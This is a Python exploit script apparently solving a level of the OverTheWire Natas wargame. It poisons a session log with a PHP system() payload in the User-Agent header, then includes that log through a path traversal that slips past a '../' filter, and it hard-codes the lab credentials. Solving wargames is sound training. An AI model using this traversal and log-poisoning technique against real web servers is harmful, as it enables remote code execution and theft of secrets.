#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas25'
password='GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url = 'http://%s.natas.labs.overthewire.org/' %username
header = {'User-Agent': "<?php system('cat /etc/natas_webpass/natas26'); ?>"}

session = requests.session()

response = session.post(url, auth=(username, password))

response = session.post(url, auth=(username, password), headers= header, data={'lang':'..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_'+ session.cookies['PHPSESSID'] +'.log'})

content = response.text
print content
# print  re.findall('Password: (.*)</pre>', content)[0]


#This level was quite a lot complicated. It santized '../' with '' so we had to bypass that somehow. So we entered '..././', so that after santization it becomes '../'. Doing this, the /etc/passwd file was not accessible. So we then tried to read the log file that was being stored for each session. 
#Over there it was observed that it was reading the 'User-Agent' from the client, so we passed a php RCE command in order to read the natas26 file.